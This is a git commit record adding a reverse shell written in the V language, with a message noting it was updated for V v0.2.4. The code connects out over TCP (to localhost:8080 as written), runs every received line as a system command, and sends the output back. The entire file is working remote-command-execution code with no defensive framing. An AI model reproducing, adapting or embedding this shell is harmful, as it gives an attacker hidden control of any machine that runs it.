b9f833631f90d7824908bb4465d4d06571dcbbc9
Potato-Industries <56988989+Potato-Industries@users.noreply.github.com>
2021-12-07 02:01:36 +0000

    2021 - Updated for Vlang (v0.2.4 1cd703d)
    Workarounds no longer needed, replaced removed/renamed functions from lib. Old version still available and works when compiled.

---
+++ vrs-latest.v
@@ -0,0 +1,38 @@
+module main
+
+import net
+import io
+import os
+
+fn exec(path string) string {
+        mut out := ''
+        mut line := ''
+        mut cmd := os.Command{
+                path: path
+        }
+        cmd.start() or { panic(err) }
+
+        for {
+                line = cmd.read_line()
+                out += line + '\n'
+                if cmd.eof {
+                        return out
+                }
+        }
+        return out
+}
+
+fn main() {
+        mut conn := net.dial_tcp('localhost:8080') ?
+        mut reader := io.new_buffered_reader(reader: conn)
+        defer {
+                reader.free()
+        }
+        for {
+                result := reader.read_line() or { return }
+                if result == '' {
+                        return
+                }
+                conn.write_string(exec(result) + '\n') or { return }
+        }
+}
